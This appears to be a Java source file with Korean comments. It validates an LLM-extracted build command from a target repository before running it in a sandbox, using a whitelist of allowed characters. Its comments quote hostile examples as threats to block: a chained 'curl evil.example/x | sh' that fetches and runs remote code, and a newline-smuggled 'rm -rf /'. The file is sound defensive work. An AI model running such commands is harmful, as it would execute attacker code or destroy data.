package com.ossagent.agent.domain;

import java.util.List;
import java.util.regex.Pattern;

/**
 * 대상 저장소의 빌드·테스트 명령 <b>문자열</b>을 argv 로 바꾼다 — #18 · S-3 · S-4.
 *
 * <h2>🔴 이 값의 출처가 무엇인지가 전부다</h2>
 *
 * <p>{@code ContributionConstraints.buildCommand} 는 <b>LLM 이 대상 저장소 문서에서 뽑은
 * 값</b>이다(#7). 우리가 통제하지 않는 문자열이 컨테이너에서 실행될 명령이 된다.
 *
 * <p>{@link ExecuteCommand} 가 이미 「argv 다, 쉘을 경유하지 않는다」를 지키지만
 * <b>그것만으로는 닫히지 않는다.</b> 공백으로 자르기만 하면
 * {@code ./gradlew test; curl evil.example/x | sh} 가 <b>argv 6개짜리 합법 명령</b>이 되고,
 * 언젠가 누군가 이 argv 를 {@code sh -c} 로 잇는 날 그대로 산다.
 * <b>메타문자는 애초에 argv 에 들어오지 못하게 한다.</b>
 *
 * <h2>거부목록이 아니라 화이트리스트다</h2>
 *
 * <p>「막을 문자를 열거」하면 열거에 없는 형태마다 구멍이 새로 난다 —
 * {@code testing-philosophy.md} 가 #28 에서 세 번 연속 당하고 적어 둔 교훈이다.
 * 여기서는 <b>명령에 실제로 쓰이는 문자만 통과</b>시킨다. 새 메타문자가 생겨도
 * 화이트리스트 밖이라 <b>그대로 막힌다.</b>
 *
 * <h2>⚠ 모르는 런처는 거부한다 — 「일단 돌려 본다」가 아니다</h2>
 *
 * <p>{@link BuildTool} 을 판정하지 못하면 {@code --offline} 을 붙일 자리도 알 수 없고
 * ({@link ExecuteCommand#of}), 그러면 network=none 에서 <b>의존성 해석이 즉시 실패가 아니라
 * 타임아웃</b>으로 나타나 30분 예산을 태운 뒤 「테스트 실패」로 오분류된다.
 * Maven 은 <b>지원하지 않는다고 실패시킨다</b> — Q-4. 조용히 네트워크를 여는 것이 최악이다.
 */
public record TargetCommandLine(List<String> argv, BuildTool buildTool) {

    /**
     * 🔴 명령에 허용되는 문자. <b>여집합이 곧 거부</b>다.
     *
     * <p>쉘 메타문자({@code ; & | $ ( ) ` < > \ ' " { } [ ] * ? ~ ! #} · 개행)는
     * 전부 이 밖이다. 열거하지 않았기 때문에 <b>빠뜨릴 수가 없다.</b>
     */
    private static final Pattern SAFE_TOKEN = Pattern.compile("[A-Za-z0-9._/@:=+,-]{1,120}");

    /** 토큰 수 상한. 대상 저장소의 빌드 명령이 이보다 길 이유가 없다 */
    private static final int MAX_TOKENS = 12;

    /** 원문 길이 상한. 모델 출력이라 상한 없이 받지 않는다 */
    private static final int MAX_RAW_LENGTH = 400;

    public TargetCommandLine {
        if (argv == null || argv.isEmpty()) {
            throw new SandboxPermanentException("실행할 명령이 비었다");
        }
        if (buildTool == null) {
            throw new SandboxPermanentException("빌드 도구를 판정하지 못했다");
        }
        argv = List.copyOf(argv);
    }

    /**
     * 명령 문자열을 판정한다. <b>모르면 거부</b>한다.
     *
     * @throws SandboxPermanentException 비었거나 · 상한을 넘거나 · 허용 문자 밖이거나 ·
     *                                   런처를 모르거나 · 지원하지 않는 빌드 도구다
     */
    public static TargetCommandLine parse(String raw) {
        if (raw == null || raw.isBlank()) {
            throw new SandboxPermanentException("대상 저장소의 빌드 명령이 비었다 (S-3)");
        }
        if (raw.length() > MAX_RAW_LENGTH) {
            throw new SandboxPermanentException(
                    "빌드 명령이 상한을 넘었다 — 모델 출력을 상한 없이 받지 않는다: " + raw.length());
        }
        // 🔴 가로 공백으로만 자른다. `\s+` 로 자르면 **개행이 공백처럼 지워져**
        //    `./gradlew test\nrm -rf /` 가 토큰 5개짜리 합법 명령이 된다 —
        //    구분자를 넓게 잡는 것이 곧 메타문자를 삼키는 일이었다.
        //    개행·탭 외 제어문자는 이제 토큰에 남아 아래 화이트리스트에 걸린다
        List<String> tokens = List.of(raw.strip().split("[ \t]+"));
        if (tokens.size() > MAX_TOKENS) {
            throw new SandboxPermanentException(
                    "빌드 명령의 토큰이 너무 많다: " + tokens.size());
        }
        for (String token : tokens) {
            if (!SAFE_TOKEN.matcher(token).matches()) {
                // ⚠ 거부된 토큰 원문을 메시지에 싣지 않는다 — 모델 출력이고 로그 인젝션 경로다
                throw new SandboxPermanentException(
                        "빌드 명령에 허용되지 않는 문자가 있다 — 쉘 메타문자일 수 있다 (S-3)");
            }
        }
        return new TargetCommandLine(tokens, launcherOf(tokens.get(0)).requireSupported());
    }

    /**
     * 🔴 {@code argv[0]} 으로만 판정한다.
     *
     * <p>명령 어딘가에 {@code gradle} 이라는 글자가 있다고 Gradle 인 것이 아니다 —
     * 실제로 도는 것은 {@code argv[0]} 이다.
     */
    private static BuildTool launcherOf(String launcher) {
        return switch (launcher) {
            case "./gradlew", "gradlew", "gradle" -> BuildTool.GRADLE;
            case "./mvnw", "mvnw", "mvn" -> BuildTool.MAVEN;
            default -> throw new SandboxPermanentException(
                    // ⚠ 런처 이름은 화이트리스트를 통과한 값이라 실을 수 있다
                    "모르는 빌드 런처다 — 오프라인 실행을 보장할 수 없다: " + launcher);
        };
    }
}
